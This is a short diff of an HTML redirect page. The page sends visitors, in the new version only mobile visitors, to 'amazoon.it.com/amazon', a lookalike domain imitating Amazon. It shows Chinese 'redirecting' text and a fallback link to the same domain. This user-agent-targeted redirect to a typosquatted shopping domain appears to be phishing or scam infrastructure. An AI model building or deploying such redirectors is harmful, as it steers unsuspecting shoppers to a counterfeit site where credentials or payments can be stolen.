@@ -1,16 +1,25 @@
 <!DOCTYPE html>
-<html lang="ja">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
-
-  <meta name="robots" content="noindex">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Redirecting...</title>
   <script>
-    setTimeout(function() {
+    // 检查是否是手机设备
+    if (/Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
       window.location.href = "https://amazoon.it.com/amazon";
-    }, 5000); // 延迟 5 秒跳转
+    }
   </script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 40px;
+    }
+  </style>
 </head>
 <body>
-  <p>ページを読み込んでいます。しばらくお待ちください...</p>
+  <h2>正在跳转...</h2>
+  <p>如果没有自动跳转，请点击 <a href="https://amazoon.it.com/amazon">这里</a>。</p>
 </body>
 </html>
